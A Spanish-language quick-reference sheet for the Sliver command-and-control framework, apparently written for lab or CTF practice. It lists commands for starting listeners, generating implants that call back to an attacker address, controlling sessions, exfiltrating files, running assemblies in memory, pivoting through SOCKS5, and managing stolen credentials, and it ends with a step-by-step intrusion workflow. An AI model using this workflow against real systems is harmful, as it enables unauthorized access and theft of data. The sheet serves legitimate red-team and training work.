# Sliver C2 — Comandos y Flujo de Trabajo

Referencia rápida para el marco de mando y control (C2) **Sliver**, cubriendo gestión de listeners, generación de implantes, control de sesiones, post-explotación y pivoting.

---

## 1. Gestión del Servidor (Listeners / Infraestructura)

| Comando | Descripción |
| :--- | :--- |
| `jobs` | Lista de listeners y tareas en ejecución. |
| `http` | Inicia listener HTTP (por defecto puerto 80 / 8080). |
| `https` | Inicia listener HTTPS seguro (puerto 443). |
| `mtls` | Inicia listener mTLS (comunicación cifrada mutua). |
| `dns` | Inicia listener DNS (para redes con estricto filtrado web). |
| `wg` | Inicia listener WireGuard (túnel VPN dedicado). |
| `jobs -k <ID>` | Detiene un trabajo o listener específico por su identificador. |

---

## 2. Generación de Implantes (Build)

| Comando | Descripción |
| :--- | :--- |
| `generate` | Crea un binario base interactivo. |
| `generate --http <IP> --os <OS>` | Genera un implante básico especificando protocolo y sistema operativo (windows/linux/darwin). |
| `profiles` | Lista los perfiles de compilación guardados. |
| `profiles new --http <IP> --name <NOMBRE>` | Guarda un perfil reutilizable con configuración fija. |
| `implants` | Lista todos los ejecutables e implantes generados previamente. |

---

## 3. Control de Sesiones y Beacons

| Comando | Descripción |
| :--- | :--- |
| `sessions` | Lista todas las sesiones activas conectadas. |
| `use <ID>` | Entra e interactúa con una sesión específica (prompt interactivo). |
| `background` | Pone la sesión actual en segundo plano y regresa a la consola principal de Sliver. |
| `info` | Muestra información técnica detallada del host objetivo (hostname, SO, arquitectura). |
| `beacons` | Gestión de implantes en modo beacon asíncrono (sigiloso, sleep / jitter). |

---

## 4. Post-Explotación (Dentro de la Sesión)

| Comando | Descripción |
| :--- | :--- |
| `ls` / `pwd` / `cd` | Navegación básica en el sistema de archivos del objetivo. |
| `upload <archivo>` | Sube un archivo local hacia la máquina comprometida. |
| `download <archivo>` | Descarga un archivo desde el objetivo a tu máquina atacante. |
| `getuid` | Muestra el usuario y nivel de privilegios actual. |
| `ps` | Lista los procesos activos en ejecución. |
| `kill <PID>` | Finaliza un proceso en la máquina objetivo. |
| `execute -f <bin> -a "<args>"` | Ejecuta un binario o comando sin abrir una shell interactiva ruidosa. |
| `shell` | Spawnea una shell interactiva del sistema (mayor nivel de ruido). |

---

## 5. Técnicas Avanzadas y Pivoting

| Comando | Descripción |
| :--- | :--- |
| `armory` | Instala extensiones y herramientas de terceros (Seatbelt, SharpHound, Rubeus, etc.). |
| `execute-assembly` | Carga y ejecuta un ensamblado .NET directamente en la memoria RAM (sin tocar disco). |
| `socks5` | Levanta un servidor proxy SOCKS5 en el implante para saltar a redes internas (Pivoting). |
| `loot` | Visualiza y gestiona credenciales, hashes y tokens robados. |
| `clean` | Limpia registros y artefactos de la base de datos local. |

---

## 6. Flujo de Trabajo Típico

1. **Configurar Listener:**
   ```text
   http --lport 8080
   jobs
   ```
2. **Generar Implante:**
   ```text
   generate --http 10.10.14.X:8080 --os windows --arch amd64 --save payload.exe
   ```
3. **Monitorear y Tomar Control:**
   ```text
   sessions
   use <SESSION_ID>
   ```
4. **Operar y Enumerar:**
   ```text
   getuid
   ps
   download C:\Users\Administrator\Desktop\flag.txt
   ```
5. **Limpieza y Cierre:**
   ```text
   sessions -k <SESSION_ID>
   jobs -k <JOB_ID>
   ```
